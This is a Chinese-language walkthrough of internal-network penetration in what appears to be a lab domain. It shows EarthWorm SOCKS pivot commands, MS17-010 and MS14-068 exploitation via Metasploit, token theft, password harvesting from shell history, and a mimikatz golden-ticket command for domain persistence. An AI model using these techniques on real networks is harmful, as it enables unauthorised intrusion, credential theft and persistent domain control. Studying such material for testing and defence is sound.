## 内网

### 代理进入

有了ubuntu直接开代理就行，正向反向都行，但是后面在用msf的时候有点问题，meterpreter的session老是断连接，后来犯了就直接不用代理了这里就简单提一下。  
我用的是ew。  
正向代理：

```
1.  `./ew  -s ssocksd -l 39555`
    
```

然后在proxychain配置文件中加上这个sock5代理即可。  
反向代理的话：  
现在kali上执行

```
1.  `ew -s rcsocks -l 39555 -e 39444`
    
```

ubuntu上执行

```
1.  `ew -s rssocks -d kali ip -e 39444`
    
```

然后进入也是加上本地39555这个代理就行了。

### 内网渗透

知道ip的情况下就不扫描了。  
直接ms17-010打就行了。

![](../Images/f1e6ae4dec44856d4a32eb6c78c03a47.png)

返回的是一个system的session

收集信息前要进行降权

![](../Images/d1f245b2659781a7996fea965289b524.png)

直接用impersonate\_token "DEMO\\douser"或者直接窃取token。

![](../Images/a7cec008bab71f48d96705c795b9a209.png)

然后就是信息收集。  

网络配置看一下。  
在域内，demo.com，DNS应该是域控的ip。  
![](../Images/ae0eb85501e56ece539b1fbe4dd94375.png)

net view一下。

![](../Images/d0de6ab98f5c1262f4357087402bf9cf.png)

看下补丁，应该是没有打ms14-068的补丁。

![](../Images/c1d3243e6df26fffacde060b6436ed70.png)

要利用还要知道域成员douser的密码，这里有两个选择，可以直接system下mimikatz，根据提示还有历史命令信息泄漏，翻了下ubuntu的历史命令，有密码，冲就完事了。

![](../Images/34da3020a6053ee7b25b9775573a073e.png)

机器桌面目录下有ms14-068，省的上传了。  

直接利用。

![](../Images/c1d3243e6df26fffacde060b6436ed70.png)

然后直接利用桌面的mimikatz导入生成的票据就完事了。

![](../Images/9ac4073b60a77afadf51e20283052754.png)

然后再用访问域控。

![](../Images/d7d0d58cfcf1358ef035d17284431c38.png)

到这里后面其实就是域维权内容了。因为过来的session实在是太tm脆弱了，后面我就没继续了。  
简单说一下即可。  
通过sc直接在域控上创建服务并且启动，用mimikatz直接导出krbtgt的hash，然后在域成员机器上用mimikatz再去伪造黄金票据就可以了。

  

```
1.  `mimikatz “kerberos::golden /domain:domain /sid:domain sid /rc4:krbtgt NTLM Hash /user:username /ptt" exit`
    
```

用户名任意。  
就可以在一段时间内维持域内权限了（krbtgt不更新密码即可）。
